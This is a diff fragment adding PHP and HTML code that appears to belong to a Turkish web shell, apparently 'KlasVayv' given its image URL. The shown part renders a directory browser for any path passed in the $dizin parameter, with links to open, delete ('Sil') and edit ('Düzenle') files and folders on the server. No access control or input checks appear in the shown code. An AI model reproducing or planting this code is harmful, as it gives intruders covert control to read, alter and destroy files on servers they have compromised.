+        onmouseout="this.style.background='#A3A3A3'"
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a href="<?echo "$fistik.php?dizin=$dizin/" ?><?echo "$ekinci";?>" style="text-decoration: none">
+        <font color="#000000">Aç</font></a></font></td>
+      </tr>
+    </table>
+    </td>
+    <td width="60" height="17" bgcolor="#C4C4C4" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber18" height="20">
+      <tr>
+        <td width="100%" bgcolor="#A3A3A3"
+        onmouseover="this.style.background='#BBBBBB'"
+        onmouseout="this.style.background='#A3A3A3'"
+
+
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a href="<?echo "$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin"?>" style="text-decoration: none">
+        <font color="#000000">Sil</font></a>
+
+        </font></td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+<?
+}
+?>
+
+<?
+}}}
+closedir($sedat);
+?>
+
+<?
+if ($sedat=@opendir($dizin)){
+while (($ekinci=readdir ($sedat))){
+if (is_file("$dizin/$ekinci")){
+
+?>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="1">
+  <tr>
+    <td width="30" height="1" bgcolor="#B0B0B0">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif"></td>
+    <td height="1" bgcolor="#EAEAEA">
+    <font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$ekinci" ?></font>
+    <font face="Arial Narrow" style="font-size: 8pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   ( XXX )&nbsp;</font></td>
+    <td width="61" height="1" bgcolor="#D6D6D6" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber12" height="20">
+      <tr>
+        <td width="100%" bgcolor="#D6D6D6"
+        onmouseover="this.style.background='#ACACAC'"
+        onmouseout="this.style.background='#D6D6D6'"
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a style="text-decoration: none" target="_self" href="<?echo "$fistik";?>.php?duzenle=<?echo "$ekinci";?>&dizin=<?echo $dizin;?>">
+        <font color="#000000">Düzenle</font></a></font></td>
+      </tr>
+    </table>
+    </td>
+    <td width="60" height="1" bgcolor="#D6D6D6" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber13" height="100%">
+      <tr>
+        <td width="100%" bgcolor="#D6D6D6" no wrap
+        onmouseover="this.style.background='#ACACAC'"
+        onmouseout="this.style.background='#D6D6D6'"
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a href="<?echo "$fistik";?>.php?sildos=<?echo $ekinci;?>&dizin=<?echo $dizin;?>" style="text-decoration: none">
+        <font color="#000000">Sil</font></a></font></td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+<?
+}}}
+closedir($sedat);
+?>
+
+
+
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber29">
+  <tr>
+    <td width="100%" bgcolor="#000000">&nbsp;</td>
+  </tr>
+</table>
+
+  <tr>
+    <td width="100%" bgcolor="#000000">
+    </body></html><? } ?><? } ?><? } ?><? } ?>
